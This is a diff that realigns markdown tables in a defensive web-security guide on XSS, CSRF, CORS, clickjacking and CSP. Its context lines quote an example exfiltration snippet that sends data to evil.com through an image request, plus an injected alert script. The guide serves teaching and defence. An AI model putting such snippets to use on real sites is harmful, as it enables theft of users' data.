@@ -119,7 +119,7 @@ In other words, **CORS misconfiguration is a state where the "breakwater for pre
 ## Anti-patterns and Solutions
 
 | Vulnerability      | ❌ Dangerous Implementation                           | ✅ Secure Countermeasure                       |
-| :--- | :--- | :--- |
+| :----------------- | :---------------------------------------------------- | :--------------------------------------------- |
 | **XSS**            | Output user input as-is in HTML without escaping      | Escape output appropriately, set CSP           |
 | **CSRF**           | Rely solely on Cookies for authentication             | Use CSRF tokens, set SameSite attribute        |
 | **Clickjacking**   | Allow iframe embedding from external sites            | Set `X-Frame-Options` or CSP `frame-ancestors` |
@@ -485,7 +485,7 @@ new Image().src='https://evil.com/collect?d='+JSON.stringify(data)
 **Comparison: `Access-Control-Allow-Origin: *` vs `Origin Reflection`**
 
 | Feature                  | ACAO: \*                           | Origin Reflection                                       |
-| :--- | :--- | :--- |
+| :----------------------- | :--------------------------------- | :------------------------------------------------------ |
 | **Allowed Target**       | Everyone                           | Everyone (granted individually)                         |
 | **Credentials (Cookie)** | Not allowed                        | Allowed (Extremely Dangerous)                           |
 | **Primary Use Case**     | Public APIs, static files          | Debugging during development (Don't use in production!) |
@@ -921,7 +921,7 @@ func corsMiddleware(next http.HandlerFunc) http.HandlerFunc {
 **Key CORS Headers:**
 
 | Header                             | Description                  | Vulnerability            |
-| :--- | :--- | :--- |
+| :--------------------------------- | :--------------------------- | :----------------------- |
 | `Access-Control-Allow-Origin`      | Allowed origin               | Use `*` cautiously       |
 | `Access-Control-Allow-Credentials` | Allow sending credentials    | Cannot be used with `*`  |
 | `Access-Control-Allow-Methods`     | Allowed HTTP methods         | Only necessary ones      |
@@ -975,7 +975,7 @@ fetch() from attacker site → Request can be sent
 **Fundamental Differences:**
 
 |                       | **CSRF**                                           | **CORS**                                   |
-| :--- | :--- | :--- |
+| :-------------------- | :------------------------------------------------- | :----------------------------------------- |
 | **Primary Target**    | **Request Submission**                             | **Response Reading**                       |
 | **Protection Target** | **Server-side** (preventing unintended operations) | **Client-side** (preventing data theft)    |
 | **Attack Nature**     | Impersonation to **perform actions**               | Data **theft** from other sites            |
@@ -1087,11 +1087,11 @@ Is sent **without preflight** → Bypasses CORS check
 **Attack Method Comparison:**
 
 | Attack Method              | Preflight? | CORS Can Block? | CSRF Token Can Block? |
-| :--- | :---: | :---: | :---: |
-| **Form POST**              | ❌ No      | ❌ No           | ✅ Yes                |
-| **fetch + PUT/DELETE**     | ✅ Yes     | ✅ Yes          | ✅ Yes                |
-| **fetch + Custom Headers** | ✅ Yes     | ✅ Yes          | ✅ Yes                |
-| **img tag GET**            | ❌ No      | ❌ No           | ⚠️ Limited            |
+| :------------------------- | :--------: | :-------------: | :-------------------: |
+| **Form POST**              |   ❌ No    |      ❌ No      |        ✅ Yes         |
+| **fetch + PUT/DELETE**     |   ✅ Yes   |     ✅ Yes      |        ✅ Yes         |
+| **fetch + Custom Headers** |   ✅ Yes   |     ✅ Yes      |        ✅ Yes         |
+| **img tag GET**            |   ❌ No    |      ❌ No      |      ⚠️ Limited       |
 
 **Summary:**
 
@@ -1142,7 +1142,7 @@ func followHandler(w http.ResponseWriter, r *http.Request) {
 **Header Values and Effects:**
 
 | Value            | Effect                                     |
-| :--- | :--- |
+| :--------------- | :----------------------------------------- |
 | `DENY`           | Rejects all iframe embedding               |
 | `SAMEORIGIN`     | Allows embedding only from the same origin |
 | `ALLOW-FROM uri` | Allows only a specific origin (Deprecated) |
@@ -1210,7 +1210,7 @@ Browser: "Only execute scripts that come from the same origin ('self')."
 #### Common Directives
 
 | Directive         | Controls                              | Example                                    |
-| :--- | :--- | :--- |
+| :---------------- | :------------------------------------ | :----------------------------------------- |
 | `script-src`      | Where JavaScript can be loaded from   | `'self'`, `'unsafe-inline'`, `'nonce-abc'` |
 | `style-src`       | Where CSS can be loaded from          | `'self'`, `'unsafe-inline'`                |
 | `img-src`         | Where images can be loaded from       | `'self'`, `https://images.example.com`     |
@@ -1226,7 +1226,7 @@ Browser: "Only execute scripts that come from the same origin ('self')."
 #### Source Values
 
 | Value             | Meaning                                          | Risk                               |
-| :--- | :--- | :--- |
+| :---------------- | :----------------------------------------------- | :--------------------------------- |
 | `'self'`          | Same origin only                                 | Safe (Recommended)                 |
 | `'none'`          | Allow nothing                                    | Safest                             |
 | `'unsafe-inline'` | Allow inline scripts/styles                      | Dangerous (Negates XSS protection) |
@@ -1315,7 +1315,7 @@ Attacker injects: <script>alert('XSS')</script>
 #### What CSP Can and Cannot Prevent
 
 | Attack                     | Prevented by CSP?                  | Reason                                  |
-| :--- | :--- | :--- |
+| :------------------------- | :--------------------------------- | :-------------------------------------- |
 | Inline `<script>` XSS      | Yes, with `script-src 'self'`      | Inline scripts are blocked              |
 | External malicious scripts | Yes, with `script-src 'self'`      | Non-allowed domains are blocked         |
 | `eval()`-based XSS         | Yes, without `unsafe-eval`         | `eval()` is blocked                     |
@@ -1371,7 +1371,7 @@ Example report body:
 ## Defensive Countermeasures Checklist
 
 | Vulnerability    | Item                                                   | Check |
-| :--- | :--- | :--- |
+| :--------------- | :----------------------------------------------------- | :---- |
 | **XSS**          | Is user input being escaped?                           | □     |
 |                  | Using automatic escaping (e.g., `html/template`)?      | □     |
 |                  | Is the HttpOnly Cookie set?                            | □     |
